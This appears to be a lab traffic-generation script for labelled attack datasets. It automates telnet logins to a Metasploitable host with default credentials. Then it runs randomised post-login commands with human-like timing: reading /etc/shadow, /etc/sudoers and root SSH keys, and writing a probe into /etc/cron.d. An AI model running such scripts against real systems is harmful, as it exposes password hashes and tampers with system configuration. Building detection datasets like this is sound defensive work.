#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"
TARGET_IP="192.168.9.131"

# ========== 可调参数 ==========
USERNAME=${USERNAME:-msfadmin}
PASSWORD=${PASSWORD:-msfadmin}
ATTACK_DURATION=${ATTACK_DURATION:-300}
THINK_PROFILE=${THINK_PROFILE:-slow}       # fast / medium / slow
ABUSE_LEVEL=${ABUSE_LEVEL:-high}             # light / medium / high
SESSION_MODE=${SESSION_MODE:-single_long}    # single_long / few_reconnect
PROMPT_REGEX=${PROMPT_REGEX:-"msfadmin@|\\$|#|>"}
PROFILE_ID="${PROFILE_ID:-slow_high_single}"                  # 留空，后续可在 notes 中手动维护
SEED=${SEED:-$RANDOM}
SESSION_TIMEOUT_EXTRA=40
# ==============================

RANDOM=$SEED

rand_int() { local min="$1" max="$2"; echo $(( RANDOM % (max - min + 1) + min )); }
chance() { local pct="$1"; local r; r=$(rand_int 1 100); [[ "$r" -le "$pct" ]]; }

configure_profile() {
    case "$THINK_PROFILE" in
        fast) INNER_SLEEP_MIN=1; INNER_SLEEP_MAX=2; GROUP_SLEEP_MIN=3; GROUP_SLEEP_MAX=6; LONG_SLEEP_PROB=5; LONG_SLEEP_MIN=8; LONG_SLEEP_MAX=12 ;;
        medium) INNER_SLEEP_MIN=1; INNER_SLEEP_MAX=3; GROUP_SLEEP_MIN=5; GROUP_SLEEP_MAX=10; LONG_SLEEP_PROB=10; LONG_SLEEP_MIN=12; LONG_SLEEP_MAX=18 ;;
        slow) INNER_SLEEP_MIN=2; INNER_SLEEP_MAX=4; GROUP_SLEEP_MIN=8; GROUP_SLEEP_MAX=15; LONG_SLEEP_PROB=15; LONG_SLEEP_MIN=15; LONG_SLEEP_MAX=22 ;;
        *) echo "[-] THINK_PROFILE must be fast / medium / slow"; exit 1 ;;
    esac
}

LIGHT_CMDS=("whoami" "id" "groups" "pwd" "uname -a" "w" "last -n 3 2>/dev/null || last | head -n 3" "ps -ef | head -n 10" "ls -la")
MEDIUM_CMDS=("sudo -n true" "sudo -n -l" "ls -ld /root" "cat /etc/passwd | head -n 8" "ls -la /etc/ssh" "cat /etc/ssh/sshd_config 2>/dev/null | head -n 20" "netstat -tulnp 2>/dev/null | head -n 10 || ss -tulnp 2>/dev/null | head -n 10" "find /home -maxdepth 2 -name '.ssh' 2>/dev/null")
HIGH_CMDS=("cat /etc/shadow" "cat /etc/sudoers" "ls -la /root/.ssh" "cat /root/.ssh/authorized_keys" "touch /root/abuse_probe" "echo abuse_probe > /etc/cron.d/abuse_probe" "cat /var/log/auth.log 2>/dev/null | tail -n 10" "cat /var/log/secure 2>/dev/null | tail -n 10")
NOISE_CMDS=("pwd" "date" "history 2>/dev/null | tail -n 5" "whomai" "sudoo -n true")

pick_from_array() { local arr="$1"; local len idx; eval "len=\${#${arr}[@]}"; idx=$(rand_int 0 $((len - 1))); eval "echo \"\${${arr}[$idx]}\""; }

pick_command() {
    local roll; roll=$(rand_int 1 100)
    case "$ABUSE_LEVEL" in
        light) [[ "$roll" -le 90 ]] && pick_from_array LIGHT_CMDS || pick_from_array NOISE_CMDS ;;
        medium) if [[ "$roll" -le 55 ]]; then pick_from_array LIGHT_CMDS; elif [[ "$roll" -le 90 ]]; then pick_from_array MEDIUM_CMDS; else pick_from_array NOISE_CMDS; fi ;;
        high) if [[ "$roll" -le 35 ]]; then pick_from_array LIGHT_CMDS; elif [[ "$roll" -le 70 ]]; then pick_from_array MEDIUM_CMDS; elif [[ "$roll" -le 95 ]]; then pick_from_array HIGH_CMDS; else pick_from_array NOISE_CMDS; fi ;;
        *) echo "[-] ABUSE_LEVEL must be light / medium / high"; exit 1 ;;
    esac
}

generate_telnet_plan() {
    local duration="$1" plan_file="$2"
    local elapsed=0 cmd_count cmd sleep_time
    : > "$plan_file"
    printf "CMD\t%s\n" "whoami" >> "$plan_file"
    printf "SLEEP\t%s\n" "$(rand_int 1 2)" >> "$plan_file"
    printf "CMD\t%s\n" "id" >> "$plan_file"
    printf "SLEEP\t%s\n" "$(rand_int 1 3)" >> "$plan_file"
    elapsed=$((elapsed + 4))

    while [[ "$elapsed" -lt "$duration" ]]; do
        cmd_count=$(rand_int 2 4)
        for _ in $(seq 1 "$cmd_count"); do
            cmd=$(pick_command)
            printf "CMD\t%s\n" "$cmd" >> "$plan_file"
            sleep_time=$(rand_int "$INNER_SLEEP_MIN" "$INNER_SLEEP_MAX")
            printf "SLEEP\t%s\n" "$sleep_time" >> "$plan_file"
            elapsed=$((elapsed + sleep_time + 1))
            [[ "$elapsed" -ge "$duration" ]] && break
        done
        [[ "$elapsed" -ge "$duration" ]] && break
        if chance "$LONG_SLEEP_PROB"; then sleep_time=$(rand_int "$LONG_SLEEP_MIN" "$LONG_SLEEP_MAX"); else sleep_time=$(rand_int "$GROUP_SLEEP_MIN" "$GROUP_SLEEP_MAX"); fi
        printf "SLEEP\t%s\n" "$sleep_time" >> "$plan_file"
        elapsed=$((elapsed + sleep_time))
    done
    printf "CMD\t%s\n" "exit" >> "$plan_file"
}

run_telnet_session() {
    local session_duration="$1"
    local plan_file="/tmp/telnet_abuse_plan_${RUN_NAME}_${SEED}_${RANDOM}.txt"
    generate_telnet_plan "$session_duration" "$plan_file"
    export TARGET_IP USERNAME PASSWORD PROMPT_REGEX PLAN_FILE="$plan_file"

    timeout $((session_duration + SESSION_TIMEOUT_EXTRA)) /usr/bin/expect << 'EXPECT_SCRIPT' >> "/tmp/telnet_abuse_debug_${RUN_NAME}.log" 2>&1 || true
set timeout 20
set target_ip $env(TARGET_IP)
set username $env(USERNAME)
set password $env(PASSWORD)
set prompt_re $env(PROMPT_REGEX)
set plan_file $env(PLAN_FILE)

spawn telnet $target_ip
expect {
    -re "(login:|Login:)" { sleep 1; send "$username\r" }
    timeout { puts "[-] timeout waiting for login prompt"; exit 1 }
}
expect {
    -re "(Password:|password:)" { sleep 1; send "$password\r" }
    timeout { puts "[-] timeout waiting for password prompt"; exit 1 }
}
expect {
    -re $prompt_re { }
    timeout { puts "[-] timeout waiting for shell prompt"; exit 1 }
}

set fp [open $plan_file r]
while {[gets $fp line] >= 0} {
    if {$line eq ""} { continue }
    set parts [split $line "\t"]
    set action [lindex $parts 0]
    set value [join [lrange $parts 1 end] "\t"]
    if {$action eq "SLEEP"} {
        sleep $value
    } elseif {$action eq "CMD"} {
        send "$value\r"
        if {$value eq "exit"} { break }
        expect {
            -re $prompt_re { }
            timeout { puts "[!] command timeout: $value" }
        }
    }
}
close $fp
EXPECT_SCRIPT
    rm -f "$plan_file"
}

configure_profile
case "$SESSION_MODE" in single_long|few_reconnect) ;; *) echo "[-] SESSION_MODE must be single_long / few_reconnect"; exit 1 ;; esac

# ========== notes 元信息 ==========
echo "RUN_ID=$RUN_NAME" | tee -a "$NOTES_FILE"
echo "RANDOM_SEED=$SEED" | tee -a "$NOTES_FILE"
echo "ATTACK_CATEGORY=ssh_telnet_abuse" | tee -a "$NOTES_FILE"
echo "ATTACK_SUBTYPE=telnet_abuse" | tee -a "$NOTES_FILE"
echo "PROFILE_ID=$PROFILE_ID" | tee -a "$NOTES_FILE"
echo "PROTOCOL=telnet" | tee -a "$NOTES_FILE"
echo "TOOL=telnet_expect" | tee -a "$NOTES_FILE"
echo "ATTACK_DURATION=$ATTACK_DURATION" | tee -a "$NOTES_FILE"
echo "THINK_PROFILE=$THINK_PROFILE" | tee -a "$NOTES_FILE"
echo "ABUSE_LEVEL=$ABUSE_LEVEL" | tee -a "$NOTES_FILE"
echo "SESSION_MODE=$SESSION_MODE" | tee -a "$NOTES_FILE"
# ==================================

PRE_IDLE=$(rand_int 6 9)
POST_IDLE=$(rand_int 6 9)
echo "等待 ${PRE_IDLE} 秒前置静默期..."
sleep "$PRE_IDLE"

echo "ATTACK_START $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"

if [[ "$SESSION_MODE" == "single_long" ]]; then
    run_telnet_session "$ATTACK_DURATION"
else
    SESSION_COUNT=$(rand_int 2 3)
    REMAINING=$ATTACK_DURATION
    for i in $(seq 1 "$SESSION_COUNT"); do
        if [[ "$i" -eq "$SESSION_COUNT" ]]; then
            SESSION_DUR=$REMAINING
        else
            MIN_DUR=70
            MAX_DUR=$((REMAINING - (SESSION_COUNT - i) * 60))
            [[ "$MAX_DUR" -lt "$MIN_DUR" ]] && SESSION_DUR=$MIN_DUR || SESSION_DUR=$(rand_int "$MIN_DUR" "$MAX_DUR")
        fi
        run_telnet_session "$SESSION_DUR"
        REMAINING=$((REMAINING - SESSION_DUR))
        if [[ "$i" -lt "$SESSION_COUNT" && "$REMAINING" -gt 0 ]]; then
            GAP=$(rand_int 4 10)
            sleep "$GAP"
            REMAINING=$((REMAINING - GAP))
        fi
        [[ "$REMAINING" -le 0 ]] && break
    done
fi

echo "ATTACK_END $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
echo "MODULE_SUMMARY=interactive_telnet_privilege_abuse_v2" | tee -a "$NOTES_FILE"
echo "等待 ${POST_IDLE} 秒后置静默期..."
sleep "$POST_IDLE"
